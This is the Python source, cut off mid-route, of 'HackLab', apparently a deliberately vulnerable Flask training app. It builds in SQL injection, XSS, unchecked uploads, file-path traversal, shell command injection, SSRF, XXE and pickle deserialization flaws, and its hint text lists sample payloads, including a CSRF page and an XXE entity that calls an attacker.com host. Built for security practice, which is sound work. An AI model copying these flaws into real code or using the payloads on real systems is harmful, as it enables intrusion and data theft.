import os
import sqlite3
import hashlib
import subprocess
import pickle
import base64
import xml.etree.ElementTree as ET
from flask import Flask, request, render_template_string, send_file, session, redirect, url_for, make_response, jsonify
from werkzeug.utils import secure_filename
import time

app = Flask(__name__)
app.secret_key = 'super_secret_key_123'  # Intentionally exposed for testing
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'vulnerable.db')

# Create upload folder if it doesn't exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Database setup
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY, 
                  username TEXT, 
                  password TEXT,
                  role TEXT,
                  credit_card TEXT)''')
    
    # Insert sample users
    sample_users = [
        (1, 'admin', hashlib.md5('admin123'.encode()).hexdigest(), 'admin', '4532-1234-5678-9012'),
        (2, 'user', hashlib.md5('userpass'.encode()).hexdigest(), 'user', '4532-8888-7777-6666'),
        (3, 'guest', hashlib.md5('guest123'.encode()).hexdigest(), 'guest', '4111-1111-1111-1111')
    ]
    
    c.executemany("INSERT OR IGNORE INTO users VALUES (?,?,?,?,?)", sample_users)
    
    # Products table
    c.execute('''CREATE TABLE IF NOT EXISTS products
                 (id INTEGER PRIMARY KEY,
                  name TEXT,
                  price REAL,
                  description TEXT)''')
    
    sample_products = [
        (1, 'Laptop', 999.99, 'High performance laptop'),
        (2, 'Mouse', 29.99, 'Wireless mouse'),
        (3, 'Keyboard', 79.99, 'Mechanical keyboard'),
        (4, 'Monitor', 299.99, '4K Monitor')
    ]
    
    c.executemany("INSERT OR IGNORE INTO products VALUES (?,?,?,?)", sample_products)
    
    conn.commit()
    conn.close()

init_db()

# Modern Hacker-Style Template (Base Template)
BASE_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HackLab - Vulnerable Web App</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <style>
        :root {
            --bg-primary: #0a0c10;
            --bg-secondary: #1a1e24;
            --accent-primary: #00ff9d;
            --accent-secondary: #00b8ff;
            --text-primary: #e0e0e0;
            --text-secondary: #888888;
            --danger: #ff5555;
            --warning: #ffaa00;
            --success: #00ff9d;
        }
        
        body {
            background-color: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow-x: hidden;
        }
        
        .navbar {
            background-color: var(--bg-secondary) !important;
            border-bottom: 2px solid var(--accent-primary);
            box-shadow: 0 0 20px rgba(0, 255, 157, 0.1);
        }
        
        .navbar-brand {
            color: var(--accent-primary) !important;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .nav-link {
            color: var(--text-primary) !important;
            transition: all 0.3s ease;
        }
        
        .nav-link:hover {
            color: var(--accent-primary) !important;
            transform: translateY(-2px);
        }
        
        .sidebar {
            background-color: var(--bg-secondary);
            min-height: calc(100vh - 56px);
            border-right: 1px solid #2a2e35;
            padding: 20px;
        }
        
        .sidebar-header {
            color: var(--accent-primary);
            font-size: 1.2rem;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-bottom: 1px solid #2a2e35;
            padding-bottom: 10px;
        }
        
        .vuln-item {
            background-color: #252b33;
            border: 1px solid #2a2e35;
            border-radius: 5px;
            padding: 10px 15px;
            margin-bottom: 10px;
            transition: all 0.3s ease;
        }
        
        .vuln-item:hover {
            border-color: var(--accent-primary);
            box-shadow: 0 0 15px rgba(0, 255, 157, 0.2);
            transform: translateX(5px);
        }
        
        .vuln-item a {
            color: var(--text-primary);
            text-decoration: none;
            display: block;
        }
        
        .vuln-item i {
            color: var(--accent-primary);
            margin-right: 10px;
        }
        
        .badge-difficulty {
            float: right;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 0.7rem;
            font-weight: bold;
        }
        
        .difficulty-low { background-color: #00ff9d; color: #000; }
        .difficulty-medium { background-color: #ffaa00; color: #000; }
        .difficulty-high { background-color: #ff5555; color: #fff; }
        
        .main-content {
            padding: 30px;
        }
        
        .card {
            background-color: var(--bg-secondary);
            border: 1px solid #2a2e35;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        
        .card-header {
            background-color: #252b33;
            border-bottom: 2px solid var(--accent-primary);
            color: var(--accent-primary);
            font-weight: bold;
            text-transform: uppercase;
            padding: 15px 20px;
        }
        
        .card-body {
            padding: 20px;
        }
        
        .form-control, .form-select {
            background-color: #252b33;
            border: 1px solid #2a2e35;
            color: var(--text-primary);
        }
        
        .form-control:focus, .form-select:focus {
            background-color: #2a2e35;
            border-color: var(--accent-primary);
            color: var(--text-primary);
            box-shadow: 0 0 0 0.25rem rgba(0, 255, 157, 0.25);
        }
        
        .btn-primary {
            background-color: var(--accent-primary);
            border-color: var(--accent-primary);
            color: #000;
            font-weight: bold;
        }
        
        .btn-primary:hover {
            background-color: #00cc7d;
            border-color: #00cc7d;
            color: #000;
        }
        
        .btn-outline-primary {
            border-color: var(--accent-primary);
            color: var(--accent-primary);
        }
        
        .btn-outline-primary:hover {
            background-color: var(--accent-primary);
            color: #000;
        }
        
        .glitch-text {
            animation: glitch 1s linear infinite;
        }
        
        @keyframes glitch {
            2%,64%{ transform: translate(2px,0) skew(0deg); }
            4%,60%{ transform: translate(-2px,0) skew(0deg); }
            62%{ transform: translate(0,0) skew(5deg); }
        }
        
        .terminal {
            background-color: #000;
            color: var(--accent-primary);
            padding: 20px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            border: 1px solid var(--accent-primary);
        }
        
        .terminal-prompt::before {
            content: "$ ";
            color: var(--accent-secondary);
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
        }
        
        .file-explorer {
            background-color: #252b33;
            border: 1px solid #2a2e35;
            border-radius: 5px;
            padding: 15px;
            font-family: 'Courier New', monospace;
        }
        
        .file-item {
            padding: 5px 10px;
            cursor: pointer;
            border-radius: 3px;
        }
        
        .file-item:hover {
            background-color: #2a2e35;
        }
        
        .file-item i {
            margin-right: 10px;
        }
        
        .file-folder { color: var(--accent-secondary); }
        .file-file { color: var(--text-primary); }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark">
        <div class="container-fluid">
            <a class="navbar-brand" href="/">
                <i class="bi bi-shield-lock-fill"></i> HackLab
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="/"><i class="bi bi-house-door"></i> Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/login"><i class="bi bi-box-arrow-in-right"></i> Login</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/reset-password"><i class="bi bi-key"></i> Reset</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link text-danger" href="/admin-panel"><i class="bi bi-exclamation-triangle"></i> Admin</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar with Vulnerability List -->
            <div class="col-md-2 sidebar">
                <div class="sidebar-header">
                    <i class="bi bi-bug-fill"></i> Vulnerabilities
                </div>
                
                <div class="vuln-item">
                    <a href="/sqli">
                        <i class="bi bi-database"></i> SQL Injection
                        <span class="badge-difficulty difficulty-low">Low</span>
                    </a>
                </div>
                
                <div class="vuln-item">
                    <a href="/xss">
                        <i class="bi bi-code-slash"></i> Cross-Site Scripting (XSS)
                        <span class="badge-difficulty difficulty-low">Low</span>
                    </a>
                </div>
                
                <div class="vuln-item">
                    <a href="/file-upload">
                        <i class="bi bi-upload"></i> File Upload Bypass
                        <span class="badge-difficulty difficulty-medium">Medium</span>
                    </a>
                </div>
                
                <div class="vuln-item">
                    <a href="/lfi">
                        <i class="bi bi-folder"></i> Local File Inclusion
                        <span class="badge-difficulty difficulty-medium">Medium</span>
                    </a>
                </div>
                
                <div class="vuln-item">
                    <a href="/command-injection">
                        <i class="bi bi-terminal"></i> Command Injection
                        <span class="badge-difficulty difficulty-high">High</span>
                    </a>
                </div>
                
                <div class="vuln-item">
                    <a href="/idor">
                        <i class="bi bi-eye-slash"></i> Insecure Direct Object Ref
                        <span class="badge-difficulty difficulty-low">Low</span>
                    </a>
                </div>
                
                <div class="vuln-item">
                    <a href="/csrf">
                        <i class="bi bi-shield-exclamation"></i> CSRF
                        <span class="badge-difficulty difficulty-medium">Medium</span>
                    </a>
                </div>
                
                <div class="vuln-item">
                    <a href="/ssrf">
                        <i class="bi bi-diagram-3"></i> SSRF
                        <span class="badge-difficulty difficulty-high">High</span>
                    </a>
                </div>
                
                <div class="vuln-item">
                    <a href="/xxe">
                        <i class="bi bi-file-earmark-code"></i> XXE
                        <span class="badge-difficulty difficulty-high">High</span>
                    </a>
                </div>
                
                <div class="vuln-item">
                    <a href="/deserialization">
                        <i class="bi bi-arrow-repeat"></i> Insecure Deserialization
                        <span class="badge-difficulty difficulty-high">High</span>
                    </a>
                </div>
                
                <div class="vuln-item">
                    <a href="/jwt">
                        <i class="bi bi-key"></i> JWT Attacks
                        <span class="badge-difficulty difficulty-medium">Medium</span>
                    </a>
                </div>
                
                <div class="vuln-item">
                    <a href="/nosql">
                        <i class="bi bi-database-fill"></i> NoSQL Injection
                        <span class="badge-difficulty difficulty-medium">Medium</span>
                    </a>
                </div>
                
                <div class="mt-4 text-secondary small">
                    <i class="bi bi-info-circle"></i> Total: 12 vulnerabilities
                </div>
            </div>
            
            <!-- Main Content Area -->
            <div class="col-md-10 main-content">
                {{ content|safe }}
            </div>
        </div>
    </div>
    
    <!-- Notification Area -->
    <div class="notification" id="notification"></div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.innerHTML = `
                <div class="alert alert-${type} alert-dismissible fade show" role="alert">
                    ${message}
                    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                </div>
            `;
            setTimeout(() => {
                notification.innerHTML = '';
            }, 5000);
        }
    </script>
</body>
</html>
"""

def render_page(content):
    """Helper function to render pages with the base template"""
    return render_template_string(BASE_TEMPLATE, content=content)

# Home Page
@app.route("/")
def home():
    content = """
        <div class="card">
            <div class="card-header">
                <i class="bi bi-terminal"></i> Welcome to HackLab
            </div>
            <div class="card-body">
                <div class="terminal">
                    <div class="terminal-prompt">Welcome to HackLab - Your Personal Hacking Playground</div>
                    <div class="terminal-prompt">Target: 127.0.0.1:5001</div>
                    <div class="terminal-prompt">Difficulty: All Levels</div>
                    <div class="terminal-prompt">Vulnerabilities: 12 Available</div>
                    <div class="terminal-prompt">----------------------------------------</div>
                    <div class="terminal-prompt">Available modules:</div>
                    <div class="terminal-prompt">  - SQL Injection (Low)</div>
                    <div class="terminal-prompt">  - XSS (Low)</div>
                    <div class="terminal-prompt">  - File Upload (Medium)</div>
                    <div class="terminal-prompt">  - LFI/RFI (Medium)</div>
                    <div class="terminal-prompt">  - Command Injection (High)</div>
                    <div class="terminal-prompt">  - IDOR (Low)</div>
                    <div class="terminal-prompt">  - CSRF (Medium)</div>
                    <div class="terminal-prompt">  - SSRF (High)</div>
                    <div class="terminal-prompt">  - XXE (High)</div>
                    <div class="terminal-prompt">  - Insecure Deserialization (High)</div>
                    <div class="terminal-prompt">  - JWT Attacks (Medium)</div>
                    <div class="terminal-prompt">  - NoSQL Injection (Medium)</div>
                    <div class="terminal-prompt">----------------------------------------</div>
                    <div class="terminal-prompt">Select a vulnerability from the sidebar to begin.</div>
                </div>
                
                <div class="row mt-4">
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">Quick Stats</div>
                            <div class="card-body">
                                <p><i class="bi bi-people-fill text-success"></i> Users: 3</p>
                                <p><i class="bi bi-file-text text-info"></i> Files: 5</p>
                                <p><i class="bi bi-database text-warning"></i> Tables: 2</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">Recent Activity</div>
                            <div class="card-body">
                                <p class="small">- New exploit added</p>
                                <p class="small">- Updated XSS vectors</p>
                                <p class="small">- Added NoSQL injection</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">Hack Tips</div>
                            <div class="card-body">
                                <p class="small">Try SQLi: ' OR 1=1 --</p>
                                <p class="small">XSS: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
                                <p class="small">LFI: ../../../../etc/passwd</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    """
    return render_page(content)

# 1. SQL Injection
@app.route("/sqli", methods=['GET', 'POST'])
def sqli():
    result = None
    query = None
    if request.method == 'POST':
        user_id = request.form.get('id', '')
        query = f"SELECT * FROM users WHERE id = {user_id}"  # Vulnerable query
        try:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute(query)
            result = c.fetchall()
            conn.close()
        except Exception as e:
            result = str(e)
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-database"></i> SQL Injection Lab
            </div>
            <div class="card-body">
                <div class="alert alert-info">
                    <strong>Goal:</strong> Extract all users from the database using SQL injection.
                    <br>Hint: Try: <code>1 OR 1=1</code> or <code>1 UNION SELECT 1,2,3,4,5</code>
                </div>
                
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">User ID:</label>
                        <input type="text" name="id" class="form-control" placeholder="Enter user ID (e.g., 1)">
                    </div>
                    <button type="submit" class="btn btn-primary">Query Database</button>
                </form>
                
                {f'''
                <div class="mt-4">
                    <h5>Executed Query:</h5>
                    <pre class="terminal">{query}</pre>
                </div>
                ''' if query else ''}
                
                {f'''
                <div class="mt-4">
                    <h5>Result:</h5>
                    <div class="terminal">
                        <pre>{result}</pre>
                    </div>
                </div>
                ''' if result else ''}
                
                <div class="mt-4">
                    <h5>Database Schema:</h5>
                    <table class="table table-dark table-striped">
                        <thead>
                            <tr>
                                <th>Column</th>
                                <th>Type</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr><td>id</td><td>INTEGER</td></tr>
                            <tr><td>username</td><td>TEXT</td></tr>
                            <tr><td>password</td><td>TEXT</td></tr>
                            <tr><td>role</td><td>TEXT</td></tr>
                            <tr><td>credit_card</td><td>TEXT</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    """
    return render_page(content)

# Store comments for XSS
comments = []

@app.route("/xss")
def xss():
    search = request.args.get('search', '')
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-code-slash"></i> Cross-Site Scripting (XSS) Lab
            </div>
            <div class="card-body">
                <ul class="nav nav-tabs" id="xssTabs">
                    <li class="nav-item">
                        <a class="nav-link active" data-bs-toggle="tab" href="#reflected">Reflected XSS</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" data-bs-toggle="tab" href="#stored">Stored XSS</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" data-bs-toggle="tab" href="#dom">DOM-based XSS</a>
                    </li>
                </ul>
                
                <div class="tab-content mt-3">
                    <!-- Reflected XSS -->
                    <div class="tab-pane active" id="reflected">
                        <div class="alert alert-info">
                            Try: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                        </div>
                        <form method="GET">
                            <div class="input-group">
                                <input type="text" name="search" class="form-control" placeholder="Search...">
                                <button class="btn btn-primary" type="submit">Search</button>
                            </div>
                        </form>
                        {f'''
                        <div class="mt-3">
                            <h5>Search Results for: {search}</h5>
                            <p>Found 0 results for "{search}"</p>
                        </div>
                        ''' if search else ''}
                    </div>
                    
                    <!-- Stored XSS -->
                    <div class="tab-pane" id="stored">
                        <div class="alert alert-info">
                            Comments are stored and displayed to all users.
                        </div>
                        <form action="/post-comment" method="POST">
                            <div class="mb-3">
                                <input type="text" name="name" class="form-control" placeholder="Your name">
                            </div>
                            <div class="mb-3">
                                <textarea name="comment" class="form-control" rows="3" placeholder="Your comment"></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Post Comment</button>
                        </form>
                        
                        <div class="mt-4">
                            <h5>Recent Comments:</h5>
                            {''.join([f'''
                            <div class="card mb-2">
                                <div class="card-body">
                                    <strong>{c['name']}</strong>
                                    <p>{c['comment']}</p>
                                </div>
                            </div>
                            ''' for c in comments])}
                        </div>
                    </div>
                    
                    <!-- DOM-based XSS -->
                    <div class="tab-pane" id="dom">
                        <div class="alert alert-info">
                            DOM-based XSS - Check the JavaScript source!
                        </div>
                        <input type="text" id="dom-input" class="form-control" placeholder="Enter text">
                        <div id="dom-output" class="mt-3"></div>
                        
                        <script>
                            document.getElementById('dom-input').addEventListener('keyup', function() {{
                                document.getElementById('dom-output').innerHTML = 'You typed: ' + this.value;
                            }});
                        </script>
                    </div>
                </div>
            </div>
        </div>
    """
    return render_page(content)

@app.route("/post-comment", methods=['POST'])
def post_comment():
    name = request.form.get('name', 'Anonymous')
    comment = request.form.get('comment', '')
    comments.append({'name': name, 'comment': comment})
    return redirect(url_for('xss', _anchor='stored'))

# 2. File Upload Vulnerability
@app.route("/file-upload", methods=['GET', 'POST'])
def file_upload():
    message = ""
    if request.method == 'POST':
        file = request.files.get('file')
        if file:
            filename = file.filename
            # Vulnerable: No proper validation
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            message = f"File uploaded successfully: {filename}"
    
    files = os.listdir(app.config['UPLOAD_FOLDER']) if os.path.exists(app.config['UPLOAD_FOLDER']) else []
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-upload"></i> File Upload Bypass Lab
            </div>
            <div class="card-body">
                <div class="alert alert-warning">
                    <strong>Challenge:</strong> Upload a PHP webshell to get RCE.
                    <br>Hint: The application only checks the file extension.
                </div>
                
                {f'<div class="alert alert-success">{message}</div>' if message else ''}
                
                <form method="POST" enctype="multipart/form-data">
                    <div class="mb-3">
                        <label class="form-label">Select file to upload:</label>
                        <input type="file" name="file" class="form-control">
                    </div>
                    <button type="submit" class="btn btn-primary">Upload</button>
                </form>
                
                <div class="mt-4">
                    <h5>Uploaded Files:</h5>
                    <div class="file-explorer">
                        {''.join([f'''
                        <div class="file-item">
                            <i class="bi bi-file-earmark file-file"></i>
                            <a href="/uploads/{f}'" target="_blank">{f}</a>
                        </div>
                        ''' for f in files])}
                    </div>
                </div>
                
                <div class="mt-4">
                    <h5>Bypass Techniques:</h5>
                    <ul>
                        <li>Double extension: <code>shell.php.jpg</code></li>
                        <li>Case manipulation: <code>shell.PhP</code></li>
                        <li>Content-type manipulation</li>
                        <li>Magic byte injection</li>
                    </ul>
                </div>
            </div>
        </div>
    """
    return render_page(content)

# Serve uploaded files (vulnerable)
@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], filename))

# 3. Local File Inclusion (LFI)
@app.route("/lfi")
def lfi():
    file = request.args.get('file', '')
    content_result = ""
    if file:
        try:
            # Vulnerable: No path traversal protection
            with open(file, 'r') as f:
                content_result = f.read()
        except Exception as e:
            content_result = f"Error reading file: {str(e)}"
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-folder"></i> Local File Inclusion Lab
            </div>
            <div class="card-body">
                <div class="alert alert-info">
                    <strong>Goal:</strong> Read sensitive system files.
                    <br>Try: <code>../../../../etc/passwd</code> or <code>../../../../etc/hosts</code>
                </div>
                
                <form method="GET">
                    <div class="input-group mb-3">
                        <input type="text" name="file" class="form-control" placeholder="Enter file path" value="{file}">
                        <button class="btn btn-primary" type="submit">Read File</button>
                    </div>
                </form>
                
                <div class="file-explorer mb-3">
                    <h6>Available Files:</h6>
                    <div class="file-item">
                        <i class="bi bi-file-earmark file-file"></i> notes.txt
                    </div>
                    <div class="file-item">
                        <i class="bi bi-file-earmark file-file"></i> config.php
                    </div>
                    <div class="file-item">
                        <i class="bi bi-file-earmark file-file"></i> users.db
                    </div>
                </div>
                
                {f'''
                <h5>File Content:</h5>
                <pre class="terminal">{content_result}</pre>
                ''' if file else ''}
                
                <h5 class="mt-4">LFI to RCE Techniques:</h5>
                <ul>
                    <li>PHP wrappers: <code>php://filter/convert.base64-encode/resource=index.php</code></li>
                    <li>Log poisoning: <code>/var/log/apache2/access.log</code></li>
                    <li>/proc/self/environ injection</li>
                </ul>
            </div>
        </div>
    """
    return render_page(content)

# 4. Command Injection
@app.route("/command-injection", methods=['GET', 'POST'])
def command_injection():
    output = ""
    if request.method == 'POST':
        ip = request.form.get('ip', '')
        # Vulnerable: Direct command execution
        try:
            output = subprocess.check_output(f'ping -n 2 {ip}', shell=True, stderr=subprocess.STDOUT, text=True)
        except Exception as e:
            output = str(e)
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-terminal"></i> Command Injection Lab
            </div>
            <div class="card-body">
                <div class="alert alert-danger">
                    <strong>WARNING:</strong> This allows system command execution!
                    <br>Try: <code>127.0.0.1 & dir</code> or <code>127.0.0.1 && whoami</code>
                </div>
                
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">Enter IP address to ping:</label>
                        <input type="text" name="ip" class="form-control" placeholder="e.g., 127.0.0.1">
                    </div>
                    <button type="submit" class="btn btn-danger">Ping</button>
                </form>
                
                {f'''
                <div class="mt-4">
                    <h5>Command Output:</h5>
                    <pre class="terminal">{output}</pre>
                </div>
                ''' if output else ''}
                
                <h5 class="mt-4">Command Injection Payloads:</h5>
                <table class="table table-dark table-striped">
                    <thead>
                        <tr>
                            <th>Operator</th>
                            <th>Example</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr><td>;</td><td>127.0.0.1; ls</td></tr>
                        <tr><td>&&</td><td>127.0.0.1 && ls</td></tr>
                        <tr><td>||</td><td>127.0.0.1 || ls</td></tr>
                        <tr><td>`</td><td>`ls`</td></tr>
                        <tr><td>$()</td><td>$(ls)</td></tr>
                        <tr><td>|</td><td>127.0.0.1 | ls</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    """
    return render_page(content)

# 5. IDOR (Insecure Direct Object Reference)
@app.route("/idor")
def idor():
    user_id = request.args.get('id', '1')
    
    # Simulate user profiles
    profiles = {
        '1': {'name': 'Admin User', 'email': 'admin@example.com', 'credit_card': '4532-1234-5678-9012', 'role': 'admin'},
        '2': {'name': 'John Doe', 'email': 'john@example.com', 'credit_card': '4532-8888-7777-6666', 'role': 'user'},
        '3': {'name': 'Jane Smith', 'email': 'jane@example.com', 'credit_card': '4111-1111-1111-1111', 'role': 'user'}
    }
    
    profile = profiles.get(user_id, {'name': 'Not Found', 'email': 'N/A'})
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-eye-slash"></i> IDOR Lab
            </div>
            <div class="card-body">
                <div class="alert alert-info">
                    <strong>Goal:</strong> Access other users' private information by manipulating the ID parameter.
                    <br>Try changing the ID parameter: <code>?id=2</code>, <code>?id=3</code>, etc.
                </div>
                
                <div class="card">
                    <div class="card-header">User Profile (ID: {user_id})</div>
                    <div class="card-body">
                        <p><strong>Name:</strong> {profile['name']}</p>
                        <p><strong>Email:</strong> {profile['email']}</p>
                        {f"<p><strong>Credit Card:</strong> {profile['credit_card']}</p>" if 'credit_card' in profile else ''}
                        {f"<p><strong>Role:</strong> {profile['role']}</p>" if 'role' in profile else ''}
                    </div>
                </div>
                
                <div class="mt-3">
                    <a href="/idor?id=1" class="btn btn-sm btn-primary">Profile 1</a>
                    <a href="/idor?id=2" class="btn btn-sm btn-primary">Profile 2</a>
                    <a href="/idor?id=3" class="btn btn-sm btn-primary">Profile 3</a>
                </div>
            </div>
        </div>
    """
    return render_page(content)

# 6. CSRF (Cross-Site Request Forgery)
@app.route("/csrf", methods=['GET', 'POST'])
def csrf():
    message = ""
    if request.method == 'POST':
        new_email = request.form.get('email', '')
        # No CSRF token check!
        session['email'] = new_email
        message = f"Email updated to: {new_email}"
    
    current_email = session.get('email', 'user@example.com')
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-shield-exclamation"></i> CSRF Lab
            </div>
            <div class="card-body">
                <div class="alert alert-warning">
                    <strong>Goal:</strong> Change the user's email without their knowledge.
                    <br>Create a malicious page that submits this form automatically.
                </div>
                
                {f'<div class="alert alert-success">{message}</div>' if message else ''}
                
                <div class="card mb-3">
                    <div class="card-header">Account Settings</div>
                    <div class="card-body">
                        <p><strong>Current Email:</strong> {current_email}</p>
                        
                        <form method="POST">
                            <div class="mb-3">
                                <label class="form-label">New Email:</label>
                                <input type="email" name="email" class="form-control" value="{current_email}">
                            </div>
                            <button type="submit" class="btn btn-warning">Update Email (No CSRF Protection!)</button>
                        </form>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">CSRF Exploit Example</div>
                    <div class="card-body">
                        <pre class="terminal">
&lt;html&gt;
  &lt;body&gt;
    &lt;form action="http://127.0.0.1:5001/csrf" method="POST" id="csrf-form"&gt;
      &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
    &lt;/form&gt;
    &lt;script&gt;document.getElementById('csrf-form').submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
                        </pre>
                    </div>
                </div>
            </div>
        </div>
    """
    return render_page(content)

# 7. SSRF (Server-Side Request Forgery)
@app.route("/ssrf", methods=['GET', 'POST'])
def ssrf():
    response = ""
    if request.method == 'POST':
        url = request.form.get('url', '')
        try:
            # Vulnerable: No URL validation
            import requests
            r = requests.get(url, timeout=5)
            response = f"Status: {r.status_code}\n\n{r.text[:500]}"
        except Exception as e:
            response = f"Error: {str(e)}"
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-diagram-3"></i> SSRF Lab
            </div>
            <div class="card-body">
                <div class="alert alert-danger">
                    <strong>Goal:</strong> Access internal services using SSRF.
                    <br>Try: <code>http://169.254.169.254/latest/meta-data/</code> (AWS metadata)
                    <br>Or: <code>http://localhost:5000/admin</code>
                </div>
                
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">Fetch URL:</label>
                        <input type="text" name="url" class="form-control" placeholder="http://example.com">
                    </div>
                    <button type="submit" class="btn btn-danger">Fetch URL</button>
                </form>
                
                {f'''
                <div class="mt-4">
                    <h5>Response:</h5>
                    <pre class="terminal">{response}</pre>
                </div>
                ''' if response else ''}
                
                <h5 class="mt-4">Common SSRF Targets:</h5>
                <ul>
                    <li>AWS Metadata: http://169.254.169.254/latest/meta-data/</li>
                    <li>GCP Metadata: http://metadata.google.internal/</li>
                    <li>Docker: http://127.0.0.1:2375/version</li>
                    <li>Kubernetes: http://localhost:10250/</li>
                    <li>Internal services: http://localhost:8080/</li>
                </ul>
            </div>
        </div>
    """
    return render_page(content)

# 8. XXE (XML External Entity)
@app.route("/xxe", methods=['GET', 'POST'])
def xxe():
    result = ""
    if request.method == 'POST':
        xml_data = request.form.get('xml', '')
        try:
            # Vulnerable: External entities enabled
            parser = ET.XMLParser()
            parser.entity = {}  # Vulnerable configuration
            root = ET.fromstring(xml_data, parser=parser)
            result = ET.tostring(root, encoding='unicode')
        except Exception as e:
            result = f"Error: {str(e)}"
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-file-earmark-code"></i> XXE Lab
            </div>
            <div class="card-body">
                <div class="alert alert-danger">
                    <strong>Goal:</strong> Read local files using XXE.
                    <br>Try injecting an external entity to read /etc/passwd
                </div>
                
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">XML Data:</label>
                        <textarea name="xml" class="form-control" rows="10" placeholder='<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>'></textarea>
                    </div>
                    <button type="submit" class="btn btn-danger">Parse XML</button>
                </form>
                
                {f'''
                <div class="mt-4">
                    <h5>Result:</h5>
                    <pre class="terminal">{result}</pre>
                </div>
                ''' if result else ''}
                
                <h5 class="mt-4">XXE Payload Examples:</h5>
                <pre class="terminal">
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ELEMENT foo ANY&gt;
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;foo&gt;&xxe;&lt;/foo&gt;

&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt;
  %xxe;
]&gt;
&lt;foo&gt;4&lt;/foo&gt;
                </pre>
            </div>
        </div>
    """
    return render_page(content)

# 9. Insecure Deserialization
class User:
    def __init__(self, name, role):
        self.name = name
        self.role = role

@app.route("/deserialization", methods=['GET', 'POST'])
def deserialization():
    result = ""
    user_data = ""
    
    if request.method == 'POST':
        if 'serialize' in request.form:
            # Create serialized object
            user = User(request.form.get('name', 'Guest'), 'user')
            user_data = base64.b64encode(pickle.dumps(user)).decode()
            result = f"Serialized: {user_data}"
        elif 'deserialize' in request.form:
            # Vulnerable deserialization
            try:
                data = request.form.get('data', '')
                user = pickle.loads(base64.b64decode(data))
                result = f"Deserialized: {user.name} (Role: {user.role})"
            except Exception as e:
                result = f"Error: {str(e)}"
    
    content = f"""
        <div class="card">
